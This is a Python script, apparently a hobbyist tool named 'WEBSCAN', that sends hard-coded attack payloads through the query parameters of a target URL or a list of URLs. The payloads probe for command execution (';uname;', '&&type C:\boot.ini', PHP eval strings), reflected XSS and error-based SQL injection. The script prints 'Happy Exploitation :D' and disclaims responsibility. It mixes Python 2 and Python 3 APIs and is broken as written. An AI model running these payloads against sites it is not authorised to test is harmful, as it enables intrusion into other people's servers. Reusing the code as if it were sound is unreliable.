#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import urllib
import os
import time
from urllib import FancyURLopener

# Colors for terminal output
class colors:
    def __init__(self):
        self.green = "\033[92m"
        self.blue = "\033[94m"
        self.bold = "\033[1m"
        self.yellow = "\033[93m"
        self.red = "\033[91m"
        self.end = "\033[0m"
ga = colors()

class UserAgent(FancyURLopener):
    version = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0'

useragent = UserAgent()

class HTTP_HEADER:
    HOST = "Host"
    SERVER = "Server"

def headers_reader(url):
    """Print server headers such as WebServer OS & Version."""
    print(ga.bold + "\n [!] Fingerprinting the backend Technologies." + ga.end)
    opener = urllib.urlopen(url)
    if opener.code == 200:
        print(ga.green + " [!] Status code: 200 OK" + ga.end)
    elif opener.code == 404:
        print(ga.red + " [!] Page was not found! Please check the URL \n" + ga.end)
        exit()

    Host = url.split("/")[2]
    Server = opener.headers.get(HTTP_HEADER.SERVER)
    print(ga.green + " [!] Host: " + str(Host) + ga.end)
    print(ga.green + " [!] WebServer: " + str(Server) + ga.end)

    for item in opener.headers.items():
        for powered in item:
            sig = "x-powered-by"
            if sig in item:
                print(ga.green + " [!] " + str(powered).strip() + ga.end)

def main_function(url, payloads, check):
    """Scan the URL by appending payloads to parameters."""
    opener = urllib.urlopen(url)
    vuln = 0
    if opener.code == 999:
        print(ga.red + " [~] WebKnight WAF Detected!" + ga.end)
        print(ga.red + " [~] Delaying 3 seconds between every request" + ga.end)
        time.sleep(3)

    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            bugs = url.replace(params, params + str(payload).strip())
            request = useragent.open(bugs)
            html = request.readlines()
            for line in html:
                checker = re.findall(check, line)
                if len(checker) != 0:
                    print(ga.red + " [*] Payload Found . . ." + ga.end)
                    print(ga.red + " [*] Payload: " + payload + ga.end)
                    print(ga.green + " [!] Code Snippet: " + ga.end + line.strip())
                    print(ga.blue + " [*] POC: " + ga.end + bugs)
                    print(ga.green + " [*] Happy Exploitation :D" + ga.end)
                    vuln += 1

    if vuln == 0:
        print(ga.green + " [!] Target is not vulnerable!" + ga.end)
    else:
        print(ga.blue + " [!] Congratulations, you've found %i bugs :-) " % vuln + ga.end)

def rce_func(url):
    headers_reader(url)
    print(ga.bold + " [!] Now Scanning for Remote Code/Command Execution " + ga.end)
    payloads = [';${@print(md5(dadevil))}', ';${@print(md5("dadevil"))}', '%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B', ';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\\[boot", re.I)
    main_function(url, payloads, check)

def xss_func(url):
    print(ga.bold + "\n [!] Now Scanning for XSS " + ga.end)
    payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', '%78%22%78%3e%78', '%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
    check = re.compile('dadevil<svg|x>x', re.I)
    main_function(url, payloads, check)

def error_based_sqli_func(url):
    print(ga.bold + "\n [!] Now Scanning for Error Based SQL Injection " + ga.end)
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    main_function(url, payloads, check)

def urls_or_list():
    url_or_list = input(" \033[1;92m[!] Scan URL or List of URLs? [1/2]: ")
    if url_or_list == "1":
        url = input(" [!] Enter the URL: ")
        if "?" in url:
            rce_func(url)
            xss_func(url)
            error_based_sqli_func(url)
        else:
            print(ga.red + "\n [Warning] Invalid URL. Please provide a full URL with parameters." + ga.end)
            exit()
    elif url_or_list == "2":
        urls_list = input(ga.green + " [!] Enter the list file name (e.g., list.txt): " + ga.end)
        try:
            with open(urls_list, "r") as f:
                for line in f.readlines():
                    url = line.strip()
                    if "?" in url:
                        print(ga.green + " \n [!] Now Scanning %s" % url + ga.end)
                        rce_func(url)
                        xss_func(url)
                        error_based_sqli_func(url)
                    else:
                        print(ga.red + "\n [Warning] Invalid URL: %s" % url + ga.end)
        except FileNotFoundError:
            print(ga.red + "\n [Error] File not found!" + ga.end)
            exit()

if __name__ == "__main__":
    os.system("clear")
    print(ga.green + """
    \033[1;96m██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗
    \033[1;95m██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
    \033[1;94m██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║
    \033[1;93m██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║
    \033[1;92m╚███╔███╔╝███████╗██████╔╝███████║╚██████╗██║  ██║██║ ╚████║
    \033[1;91m╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
    \033[1;97m********************************************************************* 
    \033[1;93m*   created:[+]\033[1;92mNOVOHORY - NOVOSAD                                     
    \033[1;92m*   github:[+]\033[1;95mNot responsible for your actions
    \033[1;92m*   Instagram:[+]\033[1;95mhttps://Instagram.com/NOVOHORY
    *********************************************************************                                                  
    """ + ga.end)
    urls_or_list()
